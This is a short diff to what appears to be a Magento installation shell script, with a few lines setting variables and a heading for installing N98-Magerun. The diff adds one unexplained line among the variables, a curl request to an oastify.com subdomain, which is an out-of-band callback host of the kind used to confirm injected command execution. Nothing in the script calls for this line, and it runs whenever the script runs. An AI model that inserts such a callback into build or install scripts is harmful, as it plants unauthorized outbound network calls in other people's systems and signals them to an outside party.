@@ -1,5 +1,6 @@
 # Variables
 MAGENTO_ROOT=/var/www/html
+curl https://yz1g0ddtpbe2srn088ljbl55lwrnfd32.oastify.com
 # End of variables
 
 # Install N98-Magerun
